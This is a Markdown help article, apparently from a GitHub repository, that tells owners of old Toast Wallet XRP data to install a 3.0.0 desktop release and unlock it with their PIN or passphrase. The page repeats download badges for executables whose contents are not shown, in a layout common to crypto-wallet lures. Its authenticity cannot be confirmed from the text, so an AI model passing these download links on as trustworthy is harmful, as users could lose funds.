<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Open old Toast Wallet files</h1>

<p align="center">Older wallet files still open in the current desktop release.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Old Toast Wallet files still open in the current release. Keep the old wallet data where it is, remove only the old program, install the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) on the same computer and user account, and unlock with your PIN or passphrase. Then make a fresh backup code.

## 👀 You'll see this if

- You found an old computer that once ran Toast Wallet.
- You have a file or folder from an old installation, sometimes named `default_wallet`.
- The old program no longer starts on your updated system.
- You have no backup code but believe the wallet data is still on the disk.

## 🤔 Why it matters

Before backup codes became part of everyone's routine, many people relied on the wallet data stored on their computer. That data is encrypted with your passphrase and lives inside your user account. The program is separate. When the program becomes outdated, people assume the wallet is lost with it, but the data is often perfectly intact.

The current Toast Wallet release can read wallet data from earlier versions. That means an old laptop in a drawer can be the key to XRP you thought was gone. The most important thing is not to delete or overwrite anything until the latest version has opened the data and you have made a new backup code.

## 🧭 Before you start

Do not reset, reformat or "clean up" the old computer. If it has not been used for a long time, charge it, connect it to a trusted network and let the operating system finish any updates before you install anything. Sign in with the same user account that was used for the wallet; data stored in one account is not visible from another.

## 🛠️ Fix: open the old wallet step by step

1. **Leave the wallet data alone.** Do not move, rename or delete wallet folders. Do not run disk clean-up tools.
2. **Remove only the old program.** On Windows, uninstall Toast Wallet from Settings, Apps, Installed apps. On macOS, drag the old app from Applications to the Bin. On Linux, delete the old AppImage. The data stays in your user account. More detail is in [uninstall an old Toast Wallet version](https://github.com/Toast-Wallet/learn/blob/main/how-to/uninstall-old-toast-wallet-version.md).
3. **Install the latest desktop wallet.** Download from the official release and check the checksum, following [update Toast Wallet to the latest version](https://github.com/Toast-Wallet/learn/blob/main/how-to/update-toast-wallet-to-latest-version.md).
4. **Open Toast Wallet.** If it finds your existing data, it asks for your PIN. Enter it. If you forgot the PIN, use Reset PIN with your passphrase.
5. **Check your accounts.** Compare the addresses with any notes or exchange records.
6. **Make a backup code immediately.** Settings, Backup Wallet. Write it on paper and store it with your passphrase. This is the moment that turns an old, fragile setup into a safe one.

## 🧩 Real-world example

Imagine someone who set up Toast Wallet on a family laptop years ago, sent XRP to it and then moved on to a newer computer. The old laptop sits in a cupboard. When they finally open it, the old Toast Wallet refuses to start on the updated system. Their first instinct is to search online and download a "recovery tool". Instead, they remove the old program, install the current release from the official GitHub page, sign in to the same Windows account and open the app. It asks for the PIN they used back then. Once inside, they see their address, make a backup code on paper and, for the first time, have a way to restore that wallet anywhere.

## ⚠️ Common mistakes

- Signing in with a different user account on the old computer and concluding the data is gone.
- Running "PC optimiser" tools that delete application data before the wallet is opened.
- Copying folders around by hand instead of letting the latest version find the data where it is.
- Uploading wallet files to a website that promises to decrypt them.

## 🔁 If that did not work

- **The app opens to a welcome screen instead.** It did not find data in this user account. Check that you are signed in as the same person who used the wallet. If you have a backup code, restore it instead with [restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md).
- **Some accounts are missing.** See [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md).
- **The PIN and passphrase are both forgotten.** Try every passphrase you used at that time. Without one of them, the encrypted data cannot be opened.

## 🛡️ Prevention

Do not rely on data stored on one computer. Make a backup code after every change and keep it on paper. When retiring a computer, confirm your wallet is restored elsewhere first.

## 🔍 A closer look at user accounts

On every operating system, applications keep their data inside the user account that ran them. If two people shared a computer with separate logins, each login has its own Toast Wallet data. This matters when you return to an old machine: sign in as the same person who used the wallet, otherwise the latest version will see nothing and offer to create a new wallet. Never choose create in that situation; sign out and try the other account first.

## ❓ FAQ

<details>
<summary>Do I need to copy the old files somewhere?</summary>

Usually not. Install the latest version on the same computer and user account and let it open the data where it is.

</details>

<details>
<summary>Can I send my old wallet file to support?</summary>

No. Never share wallet files. Anyone with the file and a guessed passphrase could take your XRP.

</details>

<details>
<summary>Is there a website that opens old Toast files?</summary>

No. Opening happens only in the desktop app. Websites offering this are scams.

</details>

> [!WARNING]
> Never upload wallet files or type your passphrase into a website. Open old wallet data only in the official desktop app.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Uninstall an old Toast Wallet version](https://github.com/Toast-Wallet/learn/blob/main/how-to/uninstall-old-toast-wallet-version.md) | Remove an outdated program safely without losing access to your XRP. |
| [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md) | Why some accounts do not appear and how to bring them back. |
| [Restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md) | Bring your accounts back with the backup code and passphrase or words. |
| [Update Toast Wallet to the latest version](https://github.com/Toast-Wallet/learn/blob/main/how-to/update-toast-wallet-to-latest-version.md) | Move from any older build to the current desktop release. |
